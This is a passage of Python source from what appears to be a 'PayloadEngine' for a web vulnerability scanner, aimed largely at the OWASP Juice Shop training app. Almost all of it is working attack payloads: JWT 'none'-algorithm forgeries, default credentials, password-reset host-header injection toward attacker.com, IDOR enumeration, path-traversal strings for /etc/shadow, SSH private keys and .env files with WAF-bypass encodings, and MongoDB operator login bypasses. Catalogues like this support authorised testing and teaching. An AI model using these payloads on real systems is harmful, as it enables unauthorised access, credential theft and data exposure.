            sub_type="jwt",
            severity="critical",
            tags=["jwt", "none_algorithm", "case_bypass"],
        ))
        payloads.append(Payload(
            value='{"alg":"nOnE","typ":"JWT"}',
            description="JWT mixed-case 'nOnE' algorithm bypass",
            detection_hint="Server accepts mixed case none algorithm variant",
            sub_type="jwt",
            severity="critical",
            tags=["jwt", "none_algorithm", "case_bypass"],
        ))
        payloads.append(Payload(
            value='{"alg":"HS256","typ":"JWT"}',
            description="JWT HS256 with weak/brute-forced secret (combine with secret list)",
            detection_hint="Server accepts token signed with commonly-used weak secret",
            sub_type="jwt",
            severity="critical",
            tags=["jwt", "weak_secret"],
        ))

        # ============================================================ #
        #  Default Credentials
        # ============================================================ #
        default_creds = [
            ("admin", "admin", "Standard admin default"),
            ("admin", "password", "Most common admin password"),
            ("admin", "admin123", "Admin with number suffix"),
            ("admin", "12345", "Numeric admin password"),
            ("admin", "password123", "Password with numbers"),
            ("admin", "letmein", "Common password"),
            ("admin", "changeme", "Default change-me password"),
            ("root", "root", "Root default credentials"),
            ("root", "toor", "Root reversed password"),
            ("test", "test", "Test account credentials"),
            ("user", "user", "Default user credentials"),
            ("demo", "demo", "Demo account credentials"),
            ("guest", "guest", "Guest account credentials"),
            ("admin@juice-sh.op", "admin123", "Juice Shop admin email with common password"),
        ]
        for username, password, desc in default_creds:
            payloads.append(Payload(
                value=f"{username}:{password}",
                description=f"Default credentials: {desc}",
                detection_hint=f"Login succeeds with {username}/{password}",
                sub_type="default_creds",
                severity="high",
                tags=["default_credentials", "brute_force"],
            ))

        # ============================================================ #
        #  Password Reset Manipulation
        # ============================================================ #
        payloads.append(Payload(
            value="admin@juice-sh.op",
            description="Juice Shop admin email for password reset attack",
            detection_hint="Password reset accepted for admin account",
            sub_type="password_reset",
            severity="high",
            juice_shop=True,
            tags=["password_reset", "admin"],
        ))
        payloads.append(Payload(
            value="X-Forwarded-Host: attacker.com",
            description="Host header injection in password reset to redirect reset link",
            detection_hint="Reset email contains attacker.com instead of legitimate host",
            sub_type="password_reset",
            severity="critical",
            tags=["password_reset", "host_injection"],
        ))
        payloads.append(Payload(
            value="X-Forwarded-For: 127.0.0.1",
            description="IP spoofing for admin panel access restriction bypass",
            detection_hint="Admin functionality accessible with spoofed localhost IP",
            sub_type="header_bypass",
            severity="high",
            tags=["header_bypass", "ip_spoof"],
        ))

        return payloads


    # ================================================================ #
    # PART 1 ENDS HERE
    # The remaining attack category builders are in PART 2
    # ================================================================ #
        # ================================================================== #
    # PART 2 - Paste this directly after _build_auth_bypass_payloads()
    # These are all methods of the PayloadEngine class
    # ================================================================== #

    # ================================================================== #
    #  IDOR PAYLOADS (45+)
    # ================================================================== #
    def _build_idor_payloads(self) -> List[Payload]:
        payloads: List[Payload] = []

        # ============================================================ #
        #  Sequential ID Enumeration
        # ============================================================ #
        for i in range(1, 21):
            payloads.append(Payload(
                value=str(i),
                description=f"Sequential ID enumeration: try accessing resource with ID={i}",
                detection_hint=f"Response contains data belonging to user with ID {i}, not current user. Compare response size/content with legitimate request",
                sub_type="sequential_id",
                severity="high",
                juice_shop=True if i <= 5 else False,
                tags=["enumeration", "sequential"],
            ))

        # ============================================================ #
        #  Special ID Values
        # ============================================================ #
        payloads.append(Payload(
            value="0",
            description="Zero ID: may return default/first resource, admin resource, or cause error",
            detection_hint="Unexpected data returned, or error message reveals valid ID range",
            sub_type="special_id",
            severity="medium",
            tags=["edge_case", "zero"],
        ))
        payloads.append(Payload(
            value="-1",
            description="Negative ID: may cause integer underflow or return unexpected resources",
            detection_hint="Error message reveals database type, or unexpected resource returned",
            sub_type="special_id",
            severity="medium",
            tags=["edge_case", "negative"],
        ))
        payloads.append(Payload(
            value="-0",
            description="Negative zero: edge case that some languages treat differently",
            detection_hint="Compare with positive zero response - differences indicate type issues",
            sub_type="special_id",
            severity="low",
            tags=["edge_case"],
        ))
        payloads.append(Payload(
            value="99999",
            description="Large ID: out of typical range, may reveal total count in error",
            detection_hint="Error message like 'ID not found' vs 'Invalid ID' reveals valid range",
            sub_type="special_id",
            severity="low",
            tags=["edge_case", "large_value"],
        ))
        payloads.append(Payload(
            value="999999999",
            description="Very large ID: may cause integer overflow on 32-bit systems",
            detection_hint="Integer overflow error or unexpected resource returned",
            sub_type="special_id",
            severity="medium",
            tags=["edge_case", "overflow"],
        ))
        payloads.append(Payload(
            value="null",
            description="Null string as ID: JavaScript backends may process as null type",
            detection_hint="Backend returns default resource or crashes with null reference",
            sub_type="special_id",
            severity="medium",
            tags=["edge_case", "type_confusion"],
        ))
        payloads.append(Payload(
            value="undefined",
            description="Undefined string as ID: Node.js backends may treat as undefined",
            detection_hint="Backend processes 'undefined' differently than invalid ID",
            sub_type="special_id",
            severity="medium",
            tags=["edge_case", "type_confusion"],
        ))
        payloads.append(Payload(
            value="NaN",
            description="NaN string as ID: may bypass numeric validation in loose comparisons",
            detection_hint="Backend accepts NaN where number expected, returns unexpected data",
            sub_type="special_id",
            severity="medium",
            tags=["edge_case", "type_confusion"],
        ))
        payloads.append(Payload(
            value="true",
            description="Boolean true as ID: type juggling may convert to 1",
            detection_hint="Backend converts 'true' to 1, returns first user's data",
            sub_type="special_id",
            severity="medium",
            tags=["edge_case", "type_juggling"],
        ))
        payloads.append(Payload(
            value="false",
            description="Boolean false as ID: type juggling may convert to 0",
            detection_hint="Backend converts 'false' to 0, returns unexpected resource",
            sub_type="special_id",
            severity="medium",
            tags=["edge_case", "type_juggling"],
        ))
        payloads.append(Payload(
            value="1e0",
            description="Scientific notation for 1: may bypass regex-only-digits validation",
            detection_hint="Backend evaluates 1e0 as 1.0, bypasses '^[0-9]+$' regex",
            sub_type="special_id",
            severity="medium",
            tags=["edge_case", "notation_bypass"],
        ))
        payloads.append(Payload(
            value="0x1",
            description="Hexadecimal 1: may bypass numeric validation",
            detection_hint="Backend parses hex value, returns resource with ID 1",
            sub_type="special_id",
            severity="medium",
            tags=["edge_case", "hex"],
        ))
        payloads.append(Payload(
            value="1.0",
            description="Float ID where integer expected: tests type handling",
            detection_hint="Float accepted where integer expected, returns resource with ID 1",
            sub_type="special_id",
            severity="low",
            tags=["edge_case", "type_confusion"],
        ))
        payloads.append(Payload(
            value="1;",
            description="ID with semicolon: may trigger SQL injection or parameter pollution",
            detection_hint="Semicolon causes SQL error or parameter parsing issue",
            sub_type="special_id",
            severity="medium",
            tags=["edge_case", "injection_probe"],
        ))
        payloads.append(Payload(
            value="1'",
            description="ID with single quote: SQL injection probe in ID parameter",
            detection_hint="SQL error confirms ID parameter is injectable",
            sub_type="special_id",
            severity="high",
            tags=["sqli_probe"],
        ))

        # ============================================================ #
        #  Parameter Names to Manipulate (Common IDOR Params)
        # ============================================================ #
        idor_params = [
            ("userId", "Primary user identifier in APIs"),
            ("user_id", "Snake-case user identifier"),
            ("uid", "Short user identifier"),
            ("id", "Generic resource identifier"),
            ("basketId", "Shopping basket/cart identifier (Juice Shop)"),
            ("basket_id", "Snake-case basket identifier"),
            ("BasketId", "PascalCase basket identifier"),
            ("orderId", "Order identifier for order history"),
            ("order_id", "Snake-case order identifier"),
            ("accountId", "Account identifier"),
            ("account_id", "Snake-case account identifier"),
            ("profileId", "User profile identifier"),
            ("profile_id", "Snake-case profile identifier"),
            ("customerId", "Customer record identifier"),
            ("customer_id", "Snake-case customer identifier"),
            ("cardId", "Payment card identifier"),
            ("addressId", "Delivery address identifier"),
            ("feedbackId", "Feedback/review identifier"),
            ("complaintId", "Complaint record identifier"),
            ("recyleId", "Recycle request identifier (Juice Shop)"),
            ("deliveryId", "Delivery method identifier"),
            ("walletId", "Digital wallet identifier"),
            ("couponId", "Coupon/discount code identifier"),
        ]
        for param_name, desc in idor_params:
            payloads.append(Payload(
                value=param_name,
                description=f"IDOR parameter: {param_name} - {desc}",
                detection_hint=f"Change {param_name} value to another user's ID. Compare response to detect unauthorized data access",
                sub_type="parameter_name",
                severity="high",
                juice_shop=True if param_name in ("basketId", "BasketId", "userId", "orderId", "feedbackId") else False,
                tags=["parameter", "idor"],
            ))

        # ============================================================ #
        #  HTTP Method Tampering
        # ============================================================ #
        method_attacks = [
            ("GET", "Try GET on POST-only endpoint: may bypass CSRF or access controls"),
            ("POST", "Try POST on GET-only endpoint: may allow data modification"),
            ("PUT", "Try PUT for unauthorized resource modification"),
            ("PATCH", "Try PATCH for partial resource modification"),
            ("DELETE", "Try DELETE for unauthorized resource deletion"),
            ("OPTIONS", "OPTIONS may reveal allowed methods and CORS configuration"),
            ("HEAD", "HEAD may bypass body-based access control checks"),
            ("TRACE", "TRACE may reflect headers including auth tokens (XST)"),
            ("CONNECT", "CONNECT may enable proxy/tunneling"),
        ]
        for method, desc in method_attacks:
            payloads.append(Payload(
                value=method,
                description=f"HTTP method tampering: {desc}",
                detection_hint=f"Unexpected success or data returned when using {method} method instead of intended method",
                sub_type="method_tampering",
                severity="high",
                tags=["method_tampering", method.lower()],
            ))

        # ============================================================ #
        #  UUID Prediction/Manipulation
        # ============================================================ #
        payloads.append(Payload(
            value="00000000-0000-0000-0000-000000000000",
            description="Null UUID (all zeros): may return admin/default resource",
            detection_hint="Null UUID returns admin resource or system default",
            sub_type="uuid",
            severity="medium",
            tags=["uuid", "null"],
        ))
        payloads.append(Payload(
            value="11111111-1111-1111-1111-111111111111",
            description="Repeating 1s UUID: predictable pattern test",
            detection_hint="Resource returned for predictable UUID pattern",
            sub_type="uuid",
            severity="medium",
            tags=["uuid", "predictable"],
        ))
        payloads.append(Payload(
            value="ffffffff-ffff-ffff-ffff-ffffffffffff",
            description="Max UUID (all f's): may cause boundary issues",
            detection_hint="Boundary UUID returns unexpected resource or error",
            sub_type="uuid",
            severity="medium",
            tags=["uuid", "boundary"],
        ))
        payloads.append(Payload(
            value="00000000-0000-0000-0000-000000000001",
            description="UUID with value 1: first resource in UUID-based system",
            detection_hint="Returns first created resource, possibly admin",
            sub_type="uuid",
            severity="medium",
            tags=["uuid", "sequential"],
        ))
        payloads.append(Payload(
            value="00000000-0000-0000-0000-000000000002",
            description="UUID with value 2: second resource enumeration",
            detection_hint="Returns second resource in sequential UUID system",
            sub_type="uuid",
            severity="medium",
            tags=["uuid", "sequential"],
        ))

        # ============================================================ #
        #  Juice Shop Specific IDOR Paths
        # ============================================================ #
        juice_shop_paths = [
            ("/api/BasketItems", "Juice Shop basket items - change BasketId to access other baskets"),
            ("/api/BasketItems/{id}", "Individual basket item - try other user basket item IDs"),
            ("/rest/basket/{id}", "Juice Shop basket endpoint - change {id} to other user IDs"),
            ("/api/Feedbacks", "All feedbacks endpoint - may expose other users' feedback"),
            ("/api/Feedbacks/{id}", "Individual feedback - access/modify other users' feedback"),
            ("/api/Users/{id}", "User profile endpoint - access other user profiles"),
            ("/api/Cards/{id}", "Payment card endpoint - access other users' cards"),
            ("/api/Addresss/{id}", "Address endpoint (note: Juice Shop typo in 'Addresss')"),
            ("/api/Recycles/{id}", "Recycle request endpoint - access others' requests"),
            ("/api/Orders/{id}", "Order endpoint - view other users' orders"),
            ("/api/Complaints", "Complaints endpoint - access other users' complaints"),
            ("/api/Quantitys", "Product quantity endpoint - may allow manipulation"),
            ("/rest/products/{id}/reviews", "Product reviews - may expose user data"),
        ]
        for path, desc in juice_shop_paths:
            payloads.append(Payload(
                value=path,
                description=f"Juice Shop IDOR: {desc}",
                detection_hint="Change ID in path. Successful access to another user's data confirms IDOR",
                sub_type="juice_shop_path",
                severity="high",
                juice_shop=True,
                tags=["juice_shop", "api_path", "idor"],
            ))

        # ============================================================ #
        #  IDOR Header Manipulation
        # ============================================================ #
        payloads.append(Payload(
            value="X-User-Id: 1",
            description="Custom user ID header injection: override authenticated user",
            detection_hint="Backend trusts X-User-Id header over session user",
            sub_type="header_idor",
            severity="critical",
            tags=["header", "user_override"],
        ))
        payloads.append(Payload(
            value="X-Original-URL: /admin",
            description="X-Original-URL header to bypass path-based access control",
            detection_hint="Admin page accessible via header URL override",
            sub_type="header_idor",
            severity="critical",
            tags=["header", "path_override"],
        ))
        payloads.append(Payload(
            value="X-Rewrite-URL: /admin",
            description="X-Rewrite-URL header for path-based access control bypass",
            detection_hint="Rewrite URL header overrides path-level restrictions",
            sub_type="header_idor",
            severity="critical",
            tags=["header", "path_override"],
        ))

        return payloads

    # ================================================================== #
    #  PATH TRAVERSAL PAYLOADS (40+)
    # ================================================================== #
    def _build_path_traversal_payloads(self) -> List[Payload]:
        payloads: List[Payload] = []

        # ============================================================ #
        #  Linux Path Traversal
        # ============================================================ #
        linux_targets = [
            ("etc/passwd", "User account database", "root:x:0:0 or similar passwd entries"),
            ("etc/shadow", "Password hash file (requires root)", "Password hashes in $6$, $5$, or $1$ format"),
            ("etc/hosts", "DNS host mappings", "localhost or custom host entries"),
            ("etc/hostname", "System hostname", "Server hostname string"),
            ("etc/os-release", "OS release information", "NAME=, VERSION=, ID= entries"),
            ("proc/self/environ", "Process environment variables", "PATH=, HOME=, or secret keys in environment"),
            ("proc/self/cmdline", "Process command line arguments", "Application startup command and arguments"),
            ("proc/self/status", "Process status information", "PID, memory usage, and process state"),
            ("proc/version", "Kernel version", "Linux version string with kernel build info"),
            ("proc/self/fd/0", "Standard input file descriptor", "Input data or error revealing fd access"),
            ("var/log/auth.log", "Authentication log (Debian/Ubuntu)", "Login attempts, sudo commands, SSH access"),
            ("var/log/apache2/access.log", "Apache access log", "HTTP requests with IPs and paths"),
            ("var/log/apache2/error.log", "Apache error log", "Application errors with stack traces"),
            ("var/log/nginx/access.log", "Nginx access log", "HTTP requests revealing application structure"),
            ("root/.ssh/id_rsa", "Root SSH private key", "RSA PRIVATE KEY content"),
            ("root/.bash_history", "Root command history", "Previously executed commands with secrets"),
            ("home/node/.env", "Node.js environment file", "Database URLs, API keys, JWT secrets"),
            ("app/.env", "Application environment file", "Configuration secrets"),
        ]

        for depth in range(3, 8):
            traversal_prefix = "../" * depth
            for target_file, desc, hint in linux_targets[:6]:
                payloads.append(Payload(
                    value=f"{traversal_prefix}{target_file}",
                    description=f"Linux path traversal ({depth} levels): {desc}",
                    detection_hint=hint,
                    sub_type="linux",
                    os_specific="linux",
                    severity="critical",
                    tags=["path_traversal", "linux", "file_read"],
                ))

        for target_file, desc, hint in linux_targets:
            payloads.append(Payload(
                value=f"../../../{target_file}",
                description=f"Linux file read: {desc}",
                detection_hint=hint,
                sub_type="linux",
                os_specific="linux",
                severity="critical",
                tags=["path_traversal", "linux", "file_read"],
            ))

        # ============================================================ #
        #  Windows Path Traversal
        # ============================================================ #
        windows_targets = [
            ("windows\\system32\\drivers\\etc\\hosts", "Windows hosts file", "localhost or host mappings"),
            ("windows\\win.ini", "Windows initialization file", "[fonts] section or [extensions]"),
            ("windows\\system.ini", "Windows system configuration", "[drivers] or [386Enh] sections"),
            ("boot.ini", "Windows boot configuration", "boot loader and OS partition info"),
            ("inetpub\\wwwroot\\web.config", "IIS web configuration", "Connection strings, app settings"),
            ("windows\\debug\\NetSetup.log", "Network setup log", "Domain join information"),
            ("windows\\repair\\SAM", "SAM database backup", "Password hashes (binary)"),
            ("Users\\Administrator\\Desktop\\", "Admin desktop", "Sensitive files on admin desktop"),
        ]

        for depth in range(3, 7):
            traversal_prefix_backslash = "..\\" * depth
            traversal_prefix_forward = "../" * depth
            for target_file, desc, hint in windows_targets[:4]:
                payloads.append(Payload(
                    value=f"{traversal_prefix_backslash}{target_file}",
                    description=f"Windows backslash traversal ({depth} levels): {desc}",
                    detection_hint=hint,
                    sub_type="windows",
                    os_specific="windows",
                    severity="critical",
                    tags=["path_traversal", "windows", "file_read"],
                ))
                forward_target = target_file.replace("\\", "/")
                payloads.append(Payload(
                    value=f"{traversal_prefix_forward}{forward_target}",
                    description=f"Windows forward-slash traversal ({depth} levels): {desc}",
                    detection_hint=hint,
                    sub_type="windows",
                    os_specific="windows",
                    severity="critical",
                    tags=["path_traversal", "windows", "file_read"],
                ))

        # ============================================================ #
        #  Null Byte Injection
        # ============================================================ #
        null_byte_variants = [
            ("../../../etc/passwd%00", "Null byte terminates filename before extension check"),
            ("../../../etc/passwd%00.jpg", "Null byte with fake .jpg extension"),
            ("../../../etc/passwd%00.png", "Null byte with fake .png extension"),
            ("../../../etc/passwd%00.pdf", "Null byte with fake .pdf extension"),
            ("../../../etc/passwd%00.html", "Null byte with fake .html extension"),
            ("../../../etc/passwd\x00", "Raw null byte (may need binary encoding)"),
            ("../../../etc/passwd\x00.txt", "Raw null byte with .txt extension"),
        ]
        for value, desc in null_byte_variants:
            payloads.append(Payload(
                value=value,
                description=f"Null byte injection: {desc}",
                detection_hint="Bypasses extension whitelist, returns passwd content despite expected extension",
                sub_type="null_byte",
                os_specific="linux",
                severity="critical",
                waf_bypass=True,
                tags=["path_traversal", "null_byte", "extension_bypass"],
            ))

        # ============================================================ #
        #  Double Encoding
        # ============================================================ #
        payloads.append(Payload(
            value="%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            description="Double URL-encoded full traversal path: decodes to ../../../etc/passwd",
            detection_hint="Application double-decodes URL, WAF only single-decodes and misses pattern",
            sub_type="double_encoded",
            severity="critical",
            waf_bypass=True,
            tags=["path_traversal", "double_encoding", "waf_bypass"],
        ))
        payloads.append(Payload(
            value="..%252f..%252f..%252fetc%252fpasswd",
            description="Double-encoded forward slashes only: dots literal, slashes encoded",
            detection_hint="WAF doesn't see ../ pattern due to double-encoded slashes",
            sub_type="double_encoded",
            severity="critical",
            waf_bypass=True,
            tags=["path_traversal", "double_encoding", "waf_bypass"],
        ))
        payloads.append(Payload(
            value="%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            description="Single URL-encoded dots: %2e = dot character",
            detection_hint="Encoded dots bypass literal ../ pattern matching",
            sub_type="encoded",
            severity="critical",
            waf_bypass=True,
            tags=["path_traversal", "url_encoding", "waf_bypass"],
        ))
        payloads.append(Payload(
            value="%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            description="Fully URL-encoded traversal: all dots and slashes encoded",
            detection_hint="Complete URL encoding hides traversal from WAF",
            sub_type="encoded",
            severity="critical",
            waf_bypass=True,
            tags=["path_traversal", "url_encoding", "waf_bypass"],
        ))

        # ============================================================ #
        #  UTF-8 Overlong Encoding
        # ============================================================ #
        payloads.append(Payload(
            value="..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            description="UTF-8 overlong encoding: %c0%af decodes to / on vulnerable parsers",
            detection_hint="Overlong UTF-8 sequence bypasses filter, some servers decode to /",
            sub_type="utf8_bypass",
            severity="critical",
            waf_bypass=True,
            tags=["path_traversal", "utf8_overlong", "waf_bypass"],
        ))
        payloads.append(Payload(
            value="..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
            description="UTF-8 fullwidth solidus (U+FF0F): alternative slash encoding",
            detection_hint="Fullwidth slash may be normalized to / by some frameworks",
            sub_type="utf8_bypass",
            severity="high",
            waf_bypass=True,
            tags=["path_traversal", "utf8", "waf_bypass"],
        ))
        payloads.append(Payload(
            value="..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
            description="UTF-8 overlong encoding variant 2: %c1%9c = backslash on IIS",
            detection_hint="IIS may decode overlong to backslash for Windows path traversal",
            sub_type="utf8_bypass",
            os_specific="windows",
            severity="critical",
            waf_bypass=True,
            tags=["path_traversal", "utf8_overlong", "iis", "waf_bypass"],
        ))

        # ============================================================ #
        #  Filter Bypass Techniques
        # ============================================================ #
        payloads.append(Payload(
            value="....//....//....//etc/passwd",
            description="Double dot-slash: filter removes ../ once, leaving valid ../",
            detection_hint="After single-pass ../ removal, ....// becomes ../ traversal works",
            sub_type="filter_bypass",
            severity="critical",
            waf_bypass=True,
            tags=["path_traversal", "recursive_filter_bypass"],
        ))
        payloads.append(Payload(
            value="....\\\\....\\\\....\\\\etc\\passwd",
            description="Double dot-backslash: same bypass technique for Windows",
            detection_hint="After single-pass ..\\ removal, remaining forms valid traversal",
            sub_type="filter_bypass",
            os_specific="windows",
            severity="critical",
            waf_bypass=True,
            tags=["path_traversal", "recursive_filter_bypass", "windows"],
        ))
        payloads.append(Payload(
            value="..;/..;/..;/etc/passwd",
            description="Semicolon path parameter bypass (Tomcat/Java servers)",
            detection_hint="Java/Tomcat treats ; as path parameter separator, ignores it for file resolution",
            sub_type="java_bypass",
            severity="critical",
            waf_bypass=True,
            tags=["path_traversal", "java", "tomcat", "waf_bypass"],
        ))
        payloads.append(Payload(
            value="..%00/..%00/..%00/etc/passwd",
            description="Null bytes between traversal segments",
            detection_hint="Null bytes may terminate path at different processing stages",
            sub_type="filter_bypass",
            severity="high",
            waf_bypass=True,
            tags=["path_traversal", "null_byte"],
        ))
        payloads.append(Payload(
            value="..././..././..././etc/passwd",
            description="Triple-dot-slash-dot bypass: stitches to ../ after filter",
            detection_hint="After removing ../, remaining ./ and .. recombine to traversal",
            sub_type="filter_bypass",
            severity="high",
            waf_bypass=True,
            tags=["path_traversal", "filter_bypass"],
        ))

        # ============================================================ #
        #  Absolute Path and Protocol Injection
        # ============================================================ #
        payloads.append(Payload(
            value="/etc/passwd",
            description="Absolute path injection: no traversal needed if path handling broken",
            detection_hint="Direct absolute path access when application prepends user input to base path",
            sub_type="absolute",
            os_specific="linux",
            severity="high",
            tags=["path_traversal", "absolute_path"],
        ))
        payloads.append(Payload(
            value="file:///etc/passwd",
            description="File protocol handler injection for server-side file access",
            detection_hint="Application processes file:// URLs on server side, returns local file",
            sub_type="protocol",
            os_specific="linux",
            severity="critical",
            tags=["path_traversal", "protocol_handler", "ssrf"],
        ))
        payloads.append(Payload(
            value="file:///c:/windows/win.ini",
            description="File protocol handler for Windows files",
            detection_hint="Windows file content returned via file:// protocol",
            sub_type="protocol",
            os_specific="windows",
            severity="critical",
            tags=["path_traversal", "protocol_handler", "ssrf", "windows"],
        ))
        payloads.append(Payload(
            value="/proc/self/cwd/app/.env",
            description="Absolute path via /proc/self/cwd to reach application directory",
            detection_hint="Application .env file with secrets (DB passwords, API keys)",
            sub_type="absolute",
            os_specific="linux",
            severity="critical",
            tags=["path_traversal", "proc", "env_file"],
        ))
        payloads.append(Payload(
            value="/proc/self/cwd/package.json",
            description="Absolute path to package.json via /proc symlink",
            detection_hint="Node.js package.json revealing dependencies and scripts",
            sub_type="absolute",
            os_specific="linux",
            severity="high",
            tags=["path_traversal", "proc", "node_js"],
        ))

        # ============================================================ #
        #  Juice Shop Specific Traversal
        # ============================================================ #
        payloads.append(Payload(
            value="../ftp",
            description="Juice Shop: access /ftp directory containing confidential files",
            detection_hint="Directory listing or file access in Juice Shop /ftp directory",
            sub_type="juice_shop",
            severity="high",
            juice_shop=True,
            tags=["juice_shop", "ftp", "directory_traversal"],
        ))
        payloads.append(Payload(
            value="/ftp/acquisitions.md",
            description="Juice Shop: access confidential acquisitions document",
            detection_hint="Confidential business document accessible without auth",
            sub_type="juice_shop",
            severity="high",
            juice_shop=True,
            tags=["juice_shop", "confidential", "info_disclosure"],
        ))
        payloads.append(Payload(
            value="/ftp/package.json.bak%2500.md",
            description="Juice Shop: access package.json backup via null byte + poison extension",
            detection_hint="Application source code configuration file exposed",
            sub_type="juice_shop",
            severity="high",
            juice_shop=True,
            waf_bypass=True,
            tags=["juice_shop", "null_byte", "backup_file"],
        ))
        payloads.append(Payload(
            value="/ftp/coupons_2013.md.bak%2500.md",
            description="Juice Shop: access backup coupon file via null byte bypass",
            detection_hint="Old coupon codes exposed from backup file",
            sub_type="juice_shop",
            severity="medium",
            juice_shop=True,
            waf_bypass=True,
            tags=["juice_shop", "null_byte", "backup_file"],
        ))
        payloads.append(Payload(
            value="/encryptionkeys",
            description="Juice Shop: access encryption keys directory",
            detection_hint="JWT or encryption keys exposed in /encryptionkeys path",
            sub_type="juice_shop",
            severity="critical",
            juice_shop=True,
            tags=["juice_shop", "encryption_keys"],
        ))
        payloads.append(Payload(
            value="/encryptionkeys/jwt.pub",
            description="Juice Shop: access JWT public key for algorithm confusion attack",
            detection_hint="JWT public key file accessible for RS256→HS256 confusion",
            sub_type="juice_shop",
            severity="critical",
            juice_shop=True,
            tags=["juice_shop", "jwt_key", "algorithm_confusion"],
        ))

        return payloads

    # ================================================================== #
    #  NOSQL INJECTION PAYLOADS (30+)
    # ================================================================== #
    def _build_nosql_payloads(self) -> List[Payload]:
        payloads: List[Payload] = []

        # ============================================================ #
        #  MongoDB Operator Injection
        # ============================================================ #
        payloads.append(Payload(
            value='{"$gt": ""}',
            description="MongoDB $gt: matches values greater than empty string (everything)",
            detection_hint="All documents returned or login bypass via always-true operator",
            sub_type="operator",
            severity="critical",
            tags=["nosqli", "mongodb", "operator"],
        ))
        payloads.append(Payload(
            value='{"$ne": ""}',
            description="MongoDB $ne: matches values not equal to empty string",
            detection_hint="All non-empty values match, bypassing exact-match checks",
            sub_type="operator",
            severity="critical",
            tags=["nosqli", "mongodb", "operator"],
        ))
        payloads.append(Payload(
            value='{"$ne": null}',
            description="MongoDB $ne null: matches any non-null value",
            detection_hint="All documents with non-null field returned",
            sub_type="operator",
            severity="critical",
            tags=["nosqli", "mongodb", "operator"],
        ))
        payloads.append(Payload(
            value='{"$regex": ".*"}',
            description="MongoDB $regex: matches any string via regex dot-star",
            detection_hint="All documents returned via regex match-all pattern",
            sub_type="operator",
            severity="critical",
            tags=["nosqli", "mongodb", "operator", "regex"],
        ))
        payloads.append(Payload(
            value='{"$regex": "^a"}',
            description="MongoDB $regex prefix: match documents starting with 'a'",
            detection_hint="Selective results allow character-by-character data extraction",
            sub_type="operator",
            severity="high",
            tags=["nosqli", "mongodb", "blind_extraction"],
        ))
        payloads.append(Payload(
            value='{"$regex": "^b"}',
            description="MongoDB $regex prefix 'b': continuation of blind extraction",
            detection_hint="Different result set than '^a' confirms regex injection",
            sub_type="operator",
            severity="high",
            tags=["nosqli", "mongodb", "blind_extraction"],
        ))
        payloads.append(Payload(
            value='{"$where": "1==1"}',
            description="MongoDB $where: JavaScript true condition, returns all documents",
            detection_hint="All documents returned via server-side JavaScript evaluation",
            sub_type="where",
            severity="critical",
            tags=["nosqli", "mongodb", "where", "javascript"],
        ))
        payloads.append(Payload(
            value='{"$where": "this.password.match(/.*/)"}',
            description="MongoDB $where with regex match on password field",
            detection_hint="Documents with matching password field returned",
            sub_type="where",
            severity="critical",
            tags=["nosqli", "mongodb", "where", "password_extraction"],
        ))
        payloads.append(Payload(
            value='{"$where": "this.username == \'admin\'"}',
            description="MongoDB $where: target admin user specifically",
            detection_hint="Admin document returned via JavaScript field comparison",
            sub_type="where",
            severity="critical",
            tags=["nosqli", "mongodb", "where", "admin"],
        ))
        payloads.append(Payload(
            value='{"$exists": true}',
            description="MongoDB $exists: match documents where field exists",
            detection_hint="All documents with the specified field are returned",
            sub_type="operator",
            severity="high",
            tags=["nosqli", "mongodb", "operator"],
        ))
        payloads.append(Payload(
            value='{"$in": ["admin", "root", "administrator"]}',
            description="MongoDB $in: match any value in provided array",
            detection_hint="Documents with username matching any listed value returned",
            sub_type="operator",
            severity="high",
            tags=["nosqli", "mongodb", "operator"],
        ))
        payloads.append(Payload(
            value='{"$or": [{"username": "admin"}, {"isAdmin": true}]}',
            description="MongoDB $or: match admin username OR isAdmin flag",
            detection_hint="Admin access through either condition matching",
            sub_type="operator",
            severity="critical",
            tags=["nosqli", "mongodb", "operator"],
        ))
        payloads.append(Payload(
            value='{"$gt": "", "$lt": "~"}',
            description="MongoDB range bypass: match anything between empty and tilde",
            detection_hint="Range covers all printable ASCII characters",
            sub_type="operator",
            severity="critical",
            tags=["nosqli", "mongodb", "operator", "range"],
        ))

        # ============================================================ #
        #  URL Parameter NoSQL Injection
        # ============================================================ #
        payloads.append(Payload(
            value="username[$ne]=invalid&password[$ne]=invalid",
            description="URL parameter bracket notation $ne injection for login bypass",
            detection_hint="Login succeeds because both fields match anything != 'invalid'",
            sub_type="url_param",
            severity="critical",
            tags=["nosqli", "url_injection", "login_bypass"],
        ))
        payloads.append(Payload(
            value="username[$gt]=&password[$gt]=",
            description="URL parameter $gt empty string injection",
            detection_hint="Login bypass via greater-than empty string comparison",
            sub_type="url_param",
            severity="critical",
            tags=["nosqli", "url_injection", "login_bypass"],
        ))
        payloads.append(Payload(
            value="username[$regex]=.*&password[$regex]=.*",
            description="URL parameter regex match-all injection",
            detection_hint="Both fields match any value via regex wildcard",
            sub_type="url_param",
            severity="critical",
            tags=["nosqli", "url_injection", "login_bypass"],
        ))
        payloads.append(Payload(
            value="username[$exists]=true&password[$exists]=true",
            description="URL parameter $exists injection",
            detection_hint="Matches any document where both fields exist",
            sub_type="url_param",
            severity="high",
            tags=["nosqli", "url_injection"],
        ))
        payloads.append(Payload(
            value="username[$nin][]=invalid&password[$nin][]=invalid",
            description="URL parameter $nin (not in array) injection",
            detection_hint="Matches documents where values are not in specified array",
            sub_type="url_param",
            severity="high",
            tags=["nosqli", "url_injection"],
        ))

        # ============================================================ #
        #  JSON Body NoSQL Injection
        # ============================================================ #
        payloads.append(Payload(
            value='{"username": {"$gt": ""}, "password": {"$gt": ""}}',
            description="JSON body NoSQL injection: both fields match via $gt",
            detection_hint="Login succeeds with operator injection in JSON POST body",
            sub_type="json_body",
            severity="critical",
            tags=["nosqli", "json_injection", "login_bypass"],
        ))
        payloads.append(Payload(
            value='{"username": {"$ne": "invaliduser"}, "password": {"$ne": "invalidpassword"}}',
            description="JSON body $ne injection: match any valid credentials",
            detection_hint="Login as first user whose creds != provided invalid values",
            sub_type="json_body",
            severity="critical",
            tags=["nosqli", "json_injection", "login_bypass"],
        ))
        payloads.append(Payload(
            value='{"username": "admin", "password": {"$gt": ""}}',
            description="JSON body: exact username with $gt password bypass",
            detection_hint="Login as admin with any non-empty password comparison bypass",
            sub_type="json_body",
            severity="critical",
